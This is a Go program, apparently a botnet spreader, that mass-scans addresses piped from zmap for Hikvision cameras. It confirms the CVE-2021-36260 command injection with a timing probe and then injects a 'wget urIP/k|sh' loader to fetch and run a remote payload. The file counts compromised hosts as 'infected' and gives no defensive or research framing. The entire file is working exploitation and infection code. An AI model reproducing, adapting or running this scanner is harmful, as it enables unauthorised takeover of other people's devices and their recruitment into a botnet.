// Hikvision CVE-2021-36260 scanner - unauth command injection via /SDK/webLanguage.
// Command space is 23 bytes, so we fetch a short loader: wget urIP/k|sh (22 chars).
// zmap -p 80 -o- | ./hik | zmap -p 8080 -o- | ./hik | zmap -p 443 -o- | ./hik
package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	loaderCmd = "wget urIP/k|sh" // exactly 22 chars (fits in 23)
	probeCmd  = "sleep 3"        // verify via time delay
)

var (
	total, hik, vuln, infected int64
	debug                      bool
)

func isHik(client *http.Client, host string) bool {
	req, _ := http.NewRequest("GET", "http://"+host+"/", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return strings.Contains(string(body), "/doc/page/login.asp?_") || strings.Contains(string(body), "login.asp")
}

// sendInjection: PUT /SDK/webLanguage with $(cmd). Returns true if HTTP 200/500.
func inject(client *http.Client, host, cmd string) bool {
	payload := "<xml><language>$(" + cmd + ")</language></xml>"
	req, _ := http.NewRequest("PUT", "http://"+host+"/SDK/webLanguage", strings.NewReader(payload))
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode == 200 || resp.StatusCode == 500
}

// verify: send a sleep command and measure response delay; if ~3s+, command ran.
func verify(client *http.Client, host string) bool {
	start := time.Now()
	inject(client, host, probeCmd)
	return time.Since(start) > 2500*time.Millisecond
}

func processTarget(host string, client *http.Client) {
	atomic.AddInt64(&total, 1)
	for _, port := range []string{"80", "8080", "443"} {
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
		if err != nil {
			continue
		}
		conn.Close()
		full := net.JoinHostPort(host, port)
		if !isHik(client, full) {
			continue
		}
		atomic.AddInt64(&hik, 1)
		if debug {
			fmt.Printf("[HIK] %s\n", full)
		}
		if verify(client, full) {
			atomic.AddInt64(&vuln, 1)
			if debug {
				fmt.Printf("[+] VULN: %s\n", full)
			}
			inject(client, full, loaderCmd)
			atomic.AddInt64(&infected, 1)
			if debug {
				fmt.Printf("[+] loader dropped on %s\n", full)
			}
		}
		return
	}
}

func main() {
	workers := flag.Int("w", 300, "workers")
	flag.BoolVar(&debug, "debug", false, "verbose")
	flag.Parse()

	client := &http.Client{Timeout: 10 * time.Second}
	sc := bufio.NewScanner(os.Stdin)
	sem := make(chan struct{}, *workers)
	var wg sync.WaitGroup

	for sc.Scan() {
		host := strings.TrimSpace(sc.Text())
		if host == "" {
			continue
		}
		if idx := strings.Index(host, ":"); idx != -1 {
			host = host[:idx]
		}
		if net.ParseIP(host) == nil {
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) { defer wg.Done(); defer func() { <-sem }(); processTarget(h, client) }(host)
	}
	wg.Wait()
	fmt.Fprintf(os.Stderr, "total=%d hik=%d vuln=%d infected=%d\n",
		atomic.LoadInt64(&total), atomic.LoadInt64(&hik), atomic.LoadInt64(&vuln), atomic.LoadInt64(&infected))
}
